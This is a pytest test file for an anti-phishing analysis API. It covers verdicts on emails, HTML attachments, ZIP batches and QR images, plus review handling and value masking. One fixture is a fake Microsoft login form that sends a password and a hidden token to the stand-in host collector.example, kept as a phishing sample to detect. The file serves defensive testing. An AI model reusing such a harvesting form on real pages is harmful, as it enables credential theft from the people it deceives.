from email.message import EmailMessage
import io
import zipfile

from fastapi.testclient import TestClient
from antiphish.api import create_app
from antiphish.analyzer import Analyzer

MAIL = 'From: team@company.ru\nSubject: Встреча\n\nВстреча завтра в десять часов.'.encode()
BAD_FORM = b'<h1>Microsoft</h1><form method="post" action="https://collector.example/send"><input name="password" type="password" value="do-not-show"><input type="hidden" name="token" value="hidden-secret"></form>'

def client_for(tmp_path, empty_kb):
    return TestClient(create_app(empty_kb, tmp_path/'history.sqlite'))

def upload(client, body=MAIL, name='message.eml'):
    response = client.post('/analyze/file',files={'file':(name,body)},data={'network':'offline'})
    assert response.status_code == 200
    assert response.json()['report']['analysis_status'] != 'FAILED'
    return response.json()

def test_web_root_and_local_assets(tmp_path, empty_kb):
    client = client_for(tmp_path,empty_kb)
    response = client.get('/')
    assert response.status_code == 200
    assert "script-src 'self'" in response.headers['content-security-policy']
    assert 'id="analysis-form"' in response.text
    assert 'data-component="laya"' in response.text
    assert client.get('/assets/app.js').status_code == 200
    assert client.get('/assets/style.css').status_code == 200

def test_form_context_has_source_and_masks_values(tmp_path, empty_kb):
    result = upload(client_for(tmp_path,empty_kb),BAD_FORM,'login.html')
    report = result['report']
    assert report['verdict'] == 'PHISHING'
    evidence = next(e for e in report['reason_codes'] if e['code']=='PHISHING_FORM_ROUTE')
    context = evidence['context']
    assert context['selection'] == 'exact-form'
    assert context['source_sha256'] == report['input']['sha256']
    assert context['destination'].startswith('https://collector.example/')
    assert context['selector'] and '<form' in context['code_excerpt']
    assert 'do-not-show' not in context['code_excerpt']
    assert 'hidden-secret' not in context['code_excerpt']
    assert 'source_bytes' not in report and 'learning_pages' not in report
    assert all('source_html' not in p and 'image_bytes' not in p for p in report['pages'])

def test_exact_review_undo_and_original_report_immutability(tmp_path, empty_kb):
    client=client_for(tmp_path,empty_kb)
    first=upload(client)
    assert first['report']['verdict']=='NOT_DETECTED'
    artifact=next(a for a in first['artifacts'] if a['kind']=='original')
    original=client.get('/reports/'+first['report_id']+'/artifacts/'+artifact['id'])
    assert original.content==MAIL
    assert original.headers['x-content-type-options']=='nosniff'
    saved=client.post('/reviews',json={'report_id':first['report_id'],'label':'phishing','comment':'Подтверждено вручную'}).json()
    second=upload(client)
    assert second['report']['verdict']=='PHISHING'
    assert second['report']['review']['match']=='exact'
    assert client.get('/reports/'+first['report_id']).json()['report']['verdict']=='NOT_DETECTED'
    assert client.get('/reviews').json()['samples'][0]['comment']=='Подтверждено вручную'
    assert client.delete('/reviews/'+saved['id']).status_code==200
    assert upload(client)['report']['verdict']=='NOT_DETECTED'

def test_benign_label_cannot_cancel_independent_form_proof(tmp_path,empty_kb):
    client=client_for(tmp_path,empty_kb)
    first=upload(client,BAD_FORM,'login.html')
    response=client.post('/reviews',json={'report_id':first['report_id'],'label':'benign'})
    assert response.status_code==200
    second=upload(client,BAD_FORM,'login.html')['report']
    assert second['verdict']=='PHISHING'
    assert 'REVIEWED_BENIGN_SAMPLE' in {e['code'] for e in second['reason_codes']}


def test_benign_review_only_suppresses_exact_original_soft_lure(tmp_path,empty_kb):
    client=client_for(tmp_path,empty_kb)
    body='<h1>Подтвердите пароль</h1><p>Обновите пароль для доступа к аккаунту.</p><a href="https://unknown.example/account">Войти</a>'.encode()
    first=upload(client,body,'notification.html')
    assert first['report']['verdict']=='SUSPICIOUS'
    assert client.post('/reviews',json={'report_id':first['report_id'],'label':'benign'}).status_code==200
    repeated=upload(client,body,'notification.html')['report']
    assert repeated['verdict']=='NOT_DETECTED'
    assert 'CREDENTIAL_LURE' in repeated['review']['suppressed_reason_codes']
    assert upload(client,body+b'<!-- modified -->','notification.html')['report']['verdict']=='SUSPICIOUS'

def test_selected_template_generalizes_and_label_can_be_changed(tmp_path,empty_kb):
    client=client_for(tmp_path,empty_kb)
    body=b'<h1>Workspace access</h1><form><input type=password name=pass></form>'
    first=upload(client,body,'login.html')
    assert first['report']['verdict']=='NOT_DETECTED'
    page=first['report']['pages'][0]['id']
    response=client.post('/reviews',json={'report_id':first['report_id'],'label':'phishing','page_ids':[page]})
    assert response.status_code==200
    changed=body+b'<!-- new copy -->'
    report=upload(client,changed,'changed.html')['report']
    assert report['verdict']=='SUSPICIOUS'
    assert 'CAMPAIGN_TEMPLATE_MATCH' in {e['code'] for e in report['reason_codes']}
    client.post('/reviews',json={'report_id':first['report_id'],'label':'benign','page_ids':[page]})
    assert upload(client,changed,'changed.html')['report']['verdict']=='NOT_DETECTED'

def test_review_rejects_a_page_from_another_report(tmp_path,empty_kb):
    client=client_for(tmp_path,empty_kb)
    result=upload(client)
    response=client.post('/reviews',json={'report_id':result['report_id'],'label':'phishing','page_ids':['page:forged']})
    assert response.status_code==422
    assert not client.get('/reviews').json()['samples']


def test_context_distinguishes_attachments_with_identical_names(tmp_path,empty_kb):
    import hashlib
    message=EmailMessage(); message.set_content('Документы во вложении')
    bodies=[b'<h1>First</h1><form><input type=password></form>',BAD_FORM]
    for body in bodies:
        message.add_attachment(body,maintype='text',subtype='html',filename='document.html')
    report=upload(client_for(tmp_path,empty_kb),message.as_bytes())['report']
    forms=[e for e in report['reason_codes'] if e['code']=='SENSITIVE_FORM']
    assert len(forms)==2
    expected={hashlib.sha256(body).hexdigest() for body in bodies}
    assert {e['context']['attachment_sha256'] for e in forms}==expected
    assert {e['context']['source_sha256'] for e in forms}==expected

def test_batch_duplicates_keep_original_and_learning_materials(tmp_path,empty_kb):
    client=client_for(tmp_path,empty_kb)
    blob=io.BytesIO()
    with zipfile.ZipFile(blob,'w') as z:
        z.writestr('a.eml',MAIL)
        z.writestr('b.eml',MAIL)
    result=client.post('/batch/file',files={'file':('mail.zip',blob.getvalue())}).json()
    assert result['statistics']['duplicates_reused']==1
    for row in result['results']:
        saved=client.get('/reports/'+row['report_id']).json()
        artifact=next(a for a in saved['artifacts'] if a['kind']=='original')
        assert client.get('/reports/'+row['report_id']+'/artifacts/'+artifact['id']).content==MAIL
        assert client.post('/reviews',json={'report_id':row['report_id'],'label':'benign'}).status_code==200

def test_qr_without_ocr_still_has_image_context(tmp_path,empty_kb,monkeypatch):
    import cv2
    import numpy as np
    from PIL import Image
    monkeypatch.setattr('antiphish.ocr.recognize',lambda image:('', 'COMPLETE'))
    pixels=cv2.QRCodeEncoder_create().encode('https://qr.example.net/login')
    pixels=cv2.resize(np.pad(pixels,8,constant_values=255),None,fx=8,fy=8,interpolation=cv2.INTER_NEAREST)
    output=io.BytesIO(); Image.fromarray(pixels).save(output,'PNG')
    result=upload(client_for(tmp_path,empty_kb),output.getvalue(),'code.png')
    evidence=next(e for e in result['report']['reason_codes'] if e['code']=='QR_EXTERNAL_DESTINATION')
    image=evidence['context']['image_artifact']
    assert any(a['id']==image and a['kind']=='image' for a in result['artifacts'])

